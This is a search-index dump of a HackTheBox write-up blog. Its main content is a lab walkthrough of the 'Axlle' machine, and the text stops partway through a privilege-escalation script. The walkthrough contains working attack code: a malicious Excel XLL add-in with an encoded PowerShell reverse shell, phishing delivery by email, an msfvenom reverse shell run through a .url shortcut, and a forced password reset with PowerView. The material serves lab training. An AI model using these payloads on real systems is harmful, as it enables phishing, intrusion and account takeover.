{"config": {"lang": ["en"], "separator": "[\\s\\-]+", "pipeline": ["stopWordFilter"]}, "docs": [{"location": "", "title": "Welcome", "text": "<p>Welcome to my humble blog. Here I share some of my write-ups for machines and possibly challenges (in the future) for the HackTheBox platform.</p> <p>Warning</p> <p>The blog is still under construction. A select few write-ups are accessible for now as I try to convert the rest of my write-ups to a presentable format.</p> <p>You can find the accessible write-ups under the <code>Write-Ups</code> tab and then navigating to <code>HackTheBox</code>.</p>"}, {"location": "Write-Ups/", "title": "HackTheBox", "text": "<p>A collection of write-ups of machines and challenges for the HackTheBox platform can be found here.</p> <p>Info</p> <p>For now the write-ups are in a simple step-by-step solution format. </p> <p>This is planned to change in the future as I try to adjust them into a more informative format. This is planned to include possible alternate ways to achieve things, some more in-depth tips and knowledge, rabbit holes that one may go down as well as post-exploitation techniques for possible persistence and analysis of vulnerabilities exploited.</p>"}, {"location": "Write-Ups/#machines", "title": "Machines", "text": "Icon Name Difficulty Operating System Access Link Alert Easy Linux Axlle Hard Windows Blazorized Hard Windows Blurry Medium Linux BoardLight Easy Linux Compiled Medium Windows Editorial Easy Linux FormulaX Hard Linux GreenHorn Easy Linux IClean Medium Linux Instant Medium Linux Intuition Hard Linux MonitorsThree Medium Linux PermX Easy Linux Resource Hard Linux Runner Medium Linux Sea Easy Linux SolarLab Medium Windows Usage Easy Linux"}, {"location": "Write-Ups/Axlle/", "title": "Axlle", "text": ""}, {"location": "Write-Ups/Axlle/#initial-enumeration", "title": "Initial Enumeration", "text": ""}, {"location": "Write-Ups/Axlle/#nmap-scan", "title": "Nmap Scan", "text": "<p>We start with an <code>Nmap</code> scan to discover open ports and subsequently run service/version scans as well as default script scans on the target.</p> <pre><code>$ sudo nmap -p- --min-rate 1000 10.129.65.77 -oN scans/all-ports-tcp.nmap\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 19:17 CET\nNmap scan report for 10.129.65.77\nHost is up (0.022s latency).\nNot shown: 65514 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n25/tcp    open  smtp\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n58949/tcp open  unknown\n58953/tcp open  unknown\n58954/tcp open  unknown\n58960/tcp open  unknown\n58975/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 112.53 seconds\n\n$ sudo nmap -p25,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.129.65.77 -oN scans/tcp-detailed.nmap\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 20:55 CET\nNmap scan report for 10.129.65.77\nHost is up (0.039s latency).\n\nPORT     STATE SERVICE       VERSION\n25/tcp   open  smtp          hMailServer smtpd\n| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Axlle Development\n| http-methods: \n|_  Potentially risky methods: TRACE\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-16 19:55:35Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp open  mc-nmf        .NET Message Framing\nService Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-01-16T19:55:45\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 58.97 seconds\n</code></pre> <ul> <li>Active Directory Domain Controller (LDAP)</li> <li>Domain name: <code>axlle.htb</code></li> <li>Host name: <code>MAINFRAME</code></li> <li>HTTP 80/TCP</li> <li>SMTP 25/TCP</li> </ul>"}, {"location": "Write-Ups/Axlle/#port-80tcp", "title": "Port 80/TCP", "text": "<p>Simple website, navigating through it we find an email address where we can send invoices/requests to in Excel format. Furthermore we see a security notice that macros are disabled.</p> <p></p>"}, {"location": "Write-Ups/Axlle/#exploitation", "title": "Exploitation", "text": ""}, {"location": "Write-Ups/Axlle/#research", "title": "Research", "text": "<p>Researching for Excel specific phishing attacks we come across multiple posts mentioning the use of <code>XLL</code> files for phishing campaigns, such as this post.</p> <p>These <code>XLL</code> files are Excel add-ins used to extend the functionality of Excel. They are basically DLL files and thus we can greatly abuse them by writing a malicious DLL. Researching some more about the XLL files, we find the Microsoft Documentation of the <code>xlAutoOpen</code> function, which must be implemented and gets called when the XLL is opened.</p> <p>For some more information about the attack, there are some great resources by:</p> <ul> <li>edparcell</li> <li>Octoberfest7</li> </ul> <p>For the following we will craft a malicious XLL file aiming to establish a reverse shell connection to our listener. We then send the malicious file as an email attachment to the previously discovered email address <code>accounts@axlle.htb</code> during our port 80/TCP enumeration.</p>"}, {"location": "Write-Ups/Axlle/#payload-creation", "title": "Payload Creation", "text": "<p>In the following we will first confirm the phishing attack using a payload aimed to initiate pings from the victim host to our attack host. For this we use the code provided by <code>edparcell</code> and edit the <code>xlAutoOpen</code> function in order to execute our desired operation.</p>"}, {"location": "Write-Ups/Axlle/#testing-with-ping", "title": "Testing with Ping", "text": "<p>To have the victim ping back to us, we can simply issue a <code>system</code> call and execute the ping command to our IP.</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdlib.h&gt;\n\nshort __stdcall xlAutoOpen()\n{\n    system(\"cmd.exe /c ping 10.10.16.33\");\n    return 1;\n}\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                    DWORD  ul_reason_for_call,\n                    LPVOID lpReserved\n                    )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n</code></pre> <p>We compile it using the <code>MinGW</code> compiler. Since we are compiling on Linux, don't forget to make the header includes lower-case, since Linux is case sensitive.</p> <pre><code>$ x86_64-w64-mingw32-gcc -shared ping.c -o ping.xll\n</code></pre> <p>And we start <code>tcpdump</code> on our Hack The Box VPN interface to catch the pings.</p> <pre><code>$ sudo tcpdump -i tun0 icmp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n</code></pre> <p>Finally we have to send the malicious XLL as an email attachment, as discussed above. We use <code>swaks</code> to send the email to the victim containing our malicious file.</p> <pre><code>$ swaks --from xpltive@axlle.htb --to accounts@axlle.htb --header \"Subject: Important notice\" --body \"Please refer to attachment\" --attach @ping.xll --server axlle.htb --port 25                                                                                                     \n=== Trying axlle.htb:25...\n=== Connected to axlle.htb.\n&lt;-  220 MAINFRAME ESMTP\n -&gt; EHLO kali\n&lt;-  250-MAINFRAME\n&lt;-  250-SIZE 20480000\n&lt;-  250-AUTH LOGIN\n&lt;-  250 HELP\n -&gt; MAIL FROM:&lt;xpltive@axlle.htb&gt;\n&lt;-  250 OK\n -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;\n&lt;-  250 OK\n -&gt; DATA\n&lt;-  354 OK, send.\n -&gt; Date: Fri, 17 Jan 2025 16:11:21 +0100\n -&gt; To: accounts@axlle.htb\n -&gt; From: xpltive@axlle.htb\n -&gt; Subject: Important notice\n -&gt; Message-Id: &lt;20250117161121.278952@kali&gt;\n -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/\n -&gt; MIME-Version: 1.0\n -&gt; Content-Type: multipart/mixed; boundary=\"----=_MIME_BOUNDARY_000_278952\"\n -&gt; \n -&gt; ------=_MIME_BOUNDARY_000_278952\n -&gt; Content-Type: text/plain\n -&gt; \n -&gt; Please refer to attachment\n -&gt; ------=_MIME_BOUNDARY_000_278952\n -&gt; Content-Type: application/octet-stream; name=\"ping.xll\"\n -&gt; Content-Description: ping.xll\n -&gt; Content-Disposition: attachment; filename=\"ping.xll\"\n -&gt; Content-Transfer-Encoding: BASE64\n -&gt; \n -&gt; TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n &lt;--SNIP--&gt;\n -&gt; aW5nd19hcHBfdHlwZQA=\n -&gt; \n -&gt; ------=_MIME_BOUNDARY_000_278952--\n -&gt; \n -&gt; \n -&gt; .\n&lt;-  250 Queued (9.864 seconds)\n -&gt; QUIT\n&lt;-  221 goodbye\n=== Connection closed with remote host.\n</code></pre> <p>Almost immediately after sending the email we get the pings from the victim to our host.</p> <pre><code>$ sudo tcpdump -i tun0 icmp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n16:05:46.839206 IP axlle.htb &gt; 10.10.16.33: ICMP echo request, id 1, seq 2, length 40\n16:05:46.839235 IP 10.10.16.33 &gt; axlle.htb: ICMP echo reply, id 1, seq 2, length 40\n16:05:47.849697 IP axlle.htb &gt; 10.10.16.33: ICMP echo request, id 1, seq 3, length 40\n</code></pre>"}, {"location": "Write-Ups/Axlle/#reverse-shell-payload", "title": "Reverse Shell Payload", "text": "<p>Having confirmed the phishing attack as being successful, we will now move on to craft our reverse shell payload. For this we will use a simple <code>base64</code> encoded PowerShell command using revshells. In the <code>xlAutoOpen</code> function we simply replace the <code>ping</code> command.</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdlib.h&gt;\n\nshort __stdcall xlAutoOpen()\n{\n    system(\"cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\");\n    return 1;\n}\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                    DWORD  ul_reason_for_call,\n                    LPVOID lpReserved\n                    )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n</code></pre> <p>Once again we compile it using <code>MinGW</code>.</p> <pre><code>$ x86_64-w64-mingw32-gcc -shared shelly.c -o shelly.xll\n</code></pre> <p>And send it as an email attachment to the victim using <code>swaks</code>.</p> <pre><code>$ swaks --from xpltive@axlle.htb --to accounts@axlle.htb --header \"Subject: Important notice\" --body \"Please refer to attachment\" --attach @shelly.xll --server axlle.htb --port 25                                                                                                   \n=== Trying axlle.htb:25...\n=== Connected to axlle.htb.\n&lt;-  220 MAINFRAME ESMTP\n -&gt; EHLO kali\n&lt;-  250-MAINFRAME\n&lt;-  250-SIZE 20480000\n&lt;-  250-AUTH LOGIN\n&lt;-  250 HELP\n -&gt; MAIL FROM:&lt;xpltive@axlle.htb&gt;\n&lt;-  250 OK\n -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;\n&lt;-  250 OK\n -&gt; DATA\n&lt;-  354 OK, send.\n -&gt; Date: Fri, 17 Jan 2025 16:05:31 +0100\n -&gt; To: accounts@axlle.htb\n -&gt; From: xpltive@axlle.htb\n -&gt; Subject: Important notice\n -&gt; Message-Id: &lt;20250117160531.272604@kali&gt;\n -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/\n -&gt; MIME-Version: 1.0\n -&gt; Content-Type: multipart/mixed; boundary=\"----=_MIME_BOUNDARY_000_272604\"\n -&gt; \n -&gt; ------=_MIME_BOUNDARY_000_272604\n -&gt; Content-Type: text/plain\n -&gt; \n -&gt; Please refer to attachment\n -&gt; ------=_MIME_BOUNDARY_000_272604\n -&gt; Content-Type: application/octet-stream; name=\"shelly.xll\"\n -&gt; Content-Description: shelly.xll\n -&gt; Content-Disposition: attachment; filename=\"shelly.xll\"\n -&gt; Content-Transfer-Encoding: BASE64\n -&gt; \n -&gt; TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n &lt;--SNIP--&gt;\n -&gt; aW5nd19hcHBfdHlwZQA=\n -&gt; \n -&gt; ------=_MIME_BOUNDARY_000_278952--\n -&gt; \n -&gt; \n -&gt; .\n&lt;-  250 Queued (9.864 seconds)\n -&gt; QUIT\n&lt;-  221 goodbye\n=== Connection closed with remote host.\n</code></pre> <p>Before issuing the above command and thus sending the email, we start our listener to catch the reverse shell connection being established by the victim. After sending the email we successfully catch the shell as domain user <code>gideon.hamill</code> on the <code>MAINFRAME</code> host.</p> <pre><code>$ rlwrap -cAr nc -lvnp 6666\nlistening on [any] 6666 ...\nconnect to [10.10.16.33] from (UNKNOWN) [10.129.65.77] 49719\n\nPS C:\\&gt; whoami\naxlle\\gideon.hamill\nPS C:\\&gt; hostname\nMAINFRAME\nPS C:\\&gt; \n</code></pre>"}, {"location": "Write-Ups/Axlle/#ad-enumeration", "title": "AD Enumeration", "text": "<p>Since we now have code execution as a domain user, we start by gathering information about the Active Directory domain <code>axlle.htb</code>.</p> <p>To do so we upload the <code>SharpHound</code> collector for <code>BloodHound</code> to the victim host and run it. We first start a download server on our attack host.</p> <pre><code>$ python3 -m http.server 1080\n</code></pre> <p>Next we download the tool to the victim host using <code>curl</code> and subsequently run it to collect all domain information and save it to a <code>zip</code> file.</p> <pre><code>PS C:\\ProgramData\\xpltive&gt; curl http://10.10.16.33:1080/SharpHound.exe -o hound.exe\nPS C:\\ProgramData\\xpltive&gt; .\\hound.exe -c All --zipfilename axlle\n\n2025-01-17T07:29:17.8884358-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-01-17T07:29:17.9040465-08:00|INFORMATION|Initializing SharpHound at 7:29 AM on 1/17/2025\n2025-01-17T07:29:18.0759172-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for axlle.htb : MAINFRAME.axlle.htb\n2025-01-17T07:29:18.1072200-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-01-17T07:29:18.3259535-08:00|INFORMATION|Beginning LDAP search for axlle.htb\n2025-01-17T07:29:18.3728350-08:00|INFORMATION|Producer has finished, closing LDAP channel\n2025-01-17T07:29:18.3728350-08:00|INFORMATION|LDAP channel closed, waiting for consumers\n2025-01-17T07:29:48.9822088-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM\n2025-01-17T07:30:07.2477771-08:00|INFORMATION|Consumers finished, closing output channel\n2025-01-17T07:30:07.2790401-08:00|INFORMATION|Output channel closed, waiting for output task to complete\nClosing writers\n2025-01-17T07:30:07.4821674-08:00|INFORMATION|Status: 113 objects finished (+113 2.306123)/s -- Using 44 MB RAM\n2025-01-17T07:30:07.4821674-08:00|INFORMATION|Enumeration finished in 00:00:49.1587646\n2025-01-17T07:30:07.5602917-08:00|INFORMATION|Saving cache with stats: 72 ID to type mappings.\n 72 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-01-17T07:30:07.5602917-08:00|INFORMATION|SharpHound Enumeration Completed at 7:30 AM on 1/17/2025! Happy Graphing!\n</code></pre> <p>We transfer the ZIP archive over to our attack host, by first starting an upload server.</p> <pre><code>$ python3 -m uploadserver 1080\n</code></pre> <p>And issue the file upload to this server using <code>curl.exe</code> on the victim host.</p> <pre><code>PS C:\\ProgramData\\xpltive&gt; curl.exe -X POST -F \"files=@20250117073007_axlle.zip\" http://10.10.16.33:1080/upload\n</code></pre> <p>After having received the file, we can import the <code>.zip</code> into our <code>BloodHound</code> instance and enumerate the AD environment.</p> <p></p> <p>Inspecting some initial information about our compromised domain user <code>gideon.hamill</code> does not get us further. However we will use this AD domain information later on. For now we will move back to enumerating the <code>MAINFRAME</code> host.</p>"}, {"location": "Write-Ups/Axlle/#host-enumeration", "title": "Host Enumeration", "text": "<p>We start with some manual enumeration on the host, getting information about privileges, groups, programs installed and potentially interesting files.</p> <p>Eventually we will come across the <code>hMailServer</code> program installed on the host, which we also fingerprinted during our initial <code>Nmap</code> scan (25/TCP). Inside the directory of it at <code>C:\\Program Files (x86)\\hMailServer\\Data\\axlle.htb\\dallon.matrix\\2F</code> we see an <code>.eml</code> file present. Upon getting the contents of the file, we will see an interesting email mentioning the development team testing automation. They ask to drop web shortcut files into <code>C:\\inetpub\\testing</code>.</p> <pre><code>PS C:\\&gt; type \"C:\\Progra~2\\hMailServer\\Data\\axlle.htb\\dallon.matrix\\2F\\{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml\"                                                                                                                                                                       \nReturn-Path: webdevs@axlle.htb\nReceived: from bumbag (Unknown [192.168.77.153])\n        by MAINFRAME with ESMTP\n        ; Mon, 1 Jan 2024 06:32:24 -0800\nDate: Tue, 02 Jan 2024 01:32:23 +1100\nTo: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb\nFrom: webdevs@axlle.htb\nSubject: OSINT Application Testing\nMessage-Id: &lt;20240102013223.019081@bumbag&gt;\nX-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/\n\nHi everyone,\n\nThe Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.\n\nWe ask that you drop any web shortcuts you have into the C:\\inetpub\\testing folder so we can test the automation.\n\nYours in click-worthy URLs,\n\nThe Web Dev Team\n</code></pre>"}, {"location": "Write-Ups/Axlle/#host-exploitation-lateral-movement-to-dallonmatrix", "title": "Host Exploitation &amp; Lateral Movement to dallon.matrix", "text": "<p>We can abuse web shortcut files (<code>.url</code>) in order to do all kinds of nefarious stuff, such as using them to reach out to a rogue SMB server that we host in order to catch NTLMv2 hashes and try to crack/relay them or since we already have code execution on the host itself, we can chose to simply run an executable.</p> <p>We craft a malicious executable using <code>MSFVenom</code> which aims to establish a reverse shell connection back to our attack host's listener.</p> <pre><code>$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.33 lport=6666 -f exe -o shelly.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shelly.exe\n</code></pre> <p>Next we prepare our malicious <code>.url</code> file with the following contents, which will run the above executable.</p> <pre><code>$ cat automation.url     \n[InternetShortcut]\nURL=\"C:\\ProgramData\\xpltive\\shelly.exe\"\n</code></pre> <p>We start a download server on our attack host in order to download the files to the victim host.</p> <pre><code>$ python3 -m http.server 1080\nServing HTTP on 0.0.0.0 port 1080 (http://0.0.0.0:1080/) ...\n</code></pre> <p>Download the files and subsequently copying the malicious <code>automation.url</code> to <code>C:\\inetpub\\testing</code>; as mentioned in the previously read email.</p> <pre><code>PS C:\\Programdata\\xpltive&gt; copy automation.url \"C:\\inetpub\\testing\"\n</code></pre> <p>Before copying the <code>.url</code> file, we obviously start our listener on our attack host in order to catch the connection attempt made by the executable. We will successfully get a reverse shell connection as <code>dallon.matrix</code> on the <code>MAINFRAME</code> host. We also start up PowerShell.</p> <pre><code>$ rlwrap -cAr nc -lvnp 6666\nlistening on [any] 6666 ...\nconnect to [10.10.16.33] from (UNKNOWN) [10.129.65.77] 49880\nMicrosoft Windows [Version 10.0.20348.2527]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\&gt;whoami\naxlle\\dallon.matrix\n\nC:\\&gt;hostname\nMAINFRAME\n\nC:\\&gt;cd ProgramData\\xpltive\n\nC:\\ProgramData\\xpltive&gt;powershell -ep bypass\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\ProgramData\\xpltive&gt;\n</code></pre> <p>The user flag can now be found at <code>C:\\Users\\dallon.matrix\\Desktop\\user.txt</code>.</p> <pre><code>PS C:\\ProgramData\\xpltive&gt; type \"C:\\Users\\dallon.matrix\\Desktop\\user.txt\"\n33fc5f5827a0ba1a5e1d83526f688501\n</code></pre>"}, {"location": "Write-Ups/Axlle/#ad-exploitation-lateral-movement-to-jacobgreeny", "title": "AD Exploitation &amp; Lateral Movement to jacob.greeny", "text": "<p>After having obtained a shell as domain user <code>dallon.matrix</code>, we go back to the <code>BloodHound</code> data and can see <code>dallon.matrix</code> is part of the domain group <code>WEB DEVS</code>, which in turn has <code>ForceChangePassword</code> permissions on the domain users <code>jacob.greeny</code> and <code>baz.humphries</code>.</p> <p></p> <p>Both of the aforementioned users are part of the <code>REMOTE MANAGEMENT USERS</code> as well as <code>APP DEVS</code> groups. The <code>REMOTE MANAGEMENT USERS</code> group would allow us to access the <code>MAINFRAME</code> host via the exposed <code>WinRM</code> service we saw during the initial <code>Nmap</code> scan.</p> <p></p> <p>We start with compromising the <code>jacob.greeny</code> domain user by abusing the <code>ForceChangePassword</code> permission. To do this we transfer over the <code>PowerView</code> tool to the <code>MAINFRAME</code> host; similar to as we have transferred files previously.</p> <p>To change the password we import <code>PowerView</code>, define a new password using <code>ConvertTo-SecureString</code> and finally set the password for <code>jacob.greeny</code> using the <code>Set-DomainUserPassword</code> functionality of <code>PowerView</code>.</p> <pre><code>PS C:\\ProgramData\\xpltive&gt; Import-Module .\\powerview.ps1\nPS C:\\ProgramData\\xpltive&gt; $pw_jacob = ConvertTo-SecureString 'P@ssword1' -AsPlainText -Force\nPS C:\\ProgramData\\xpltive&gt; Set-DomainUserPassword -Identity jacob.greeny -AccountPassword $pw_jacob\n</code></pre> <p>Since <code>jacob.greeny</code> is part of the <code>REMOTE MANAGEMENT USERS</code> group, we can now authenticate via <code>WinRM</code> to the <code>MAINFRAME</code> host using the password we just set. We use <code>Evil-WinRM</code> for this.</p> <pre><code>$ evil-winrm -i MAINFRAME.axlle.htb -u jacob.greeny -p 'P@ssword1'                 \n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\jacob.greeny\\Documents&gt; whoami\naxlle\\jacob.greeny\n*Evil-WinRM* PS C:\\Users\\jacob.greeny\\Documents&gt; hostname\nMAINFRAME\n</code></pre>"}, {"location": "Write-Ups/Axlle/#host-enumeration-as-jacobgreeny", "title": "Host Enumeration as jacob.greeny", "text": "<p>With code execution as <code>jacob.greeny</code> we can now access the <code>C:\\App Development</code> folder present on the victim host.</p> <pre><code>*Evil-WinRM* PS C:\\&gt; cmd /c tree /a /f \"App Development\"\nFolder PATH listing\nVolume serial number is 000001D3 BFF7:F940\nC:\\APP DEVELOPMENT\n\\---kbfiltr\n    |   kbfiltr.sln\n    |   README.md\n    |\n    +---exe\n    |       kbftest.c\n    |       kbftest.vcxproj\n    |       kbftest.vcxproj.Filters\n    |\n    \\---sys\n            kbfiltr.c\n            kbfiltr.h\n            kbfiltr.inx\n            kbfiltr.rc\n            kbfiltr.vcxproj\n            kbfiltr.vcxproj.Filters\n            public.h\n            rawpdo.c\n</code></pre> <p>We see some source files for a <code>C</code> program called <code>kbfiltr</code>, which upon researching a bit on it online appears to be a slightly modified version of the Keyboard Input WDF Filter Driver by Microsoft. The source code can also be found on Microsoft's GitHub .</p>"}, {"location": "Write-Ups/Axlle/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>Getting the contents of the <code>README.md</code> at <code>C:\\App Development\\kbfiltr\\README.md</code> reveals some interesting information in form of a note someone left:</p> <pre><code>*Evil-WinRM* PS C:\\App Development\\kbfiltr&gt; type README.md\n&lt;--SNIP--&gt;\n**NOTE: I have automated the running of `C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**\n&lt;--SNIP--&gt;\n</code></pre> <p>We gain knowledge that the <code>standalonerunner.exe</code> is running automated as SYSTEM to debug the <code>kbfiltr</code>. Upon googling for the <code>standalonerunner.exe</code> we come across a GitHub repository by <code>nasbench</code>. They researched the executable and found that one could achieve arbitrary code execution.</p> <p>This helps us greatly, as we know the <code>standalonerunner.exe</code> is configured to run as <code>SYSTEM</code>. So if we get code execution this way, we have ultimately compromised the host.</p> <p>We follow the steps <code>nasbench</code> provided and create a quick <code>.bat</code> script that does the steps for us with the following contents.</p> <pre><code>@echo off\n(echo myTestDir &amp;&amp; echo True) &gt;&gt; \"C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\reboot.rsf\"\nmkdir \"C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\myTestDir\\working\"\necho $null &gt; \"C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\myTestDir\\working\\rsf.rsf\"\necho powershell -e 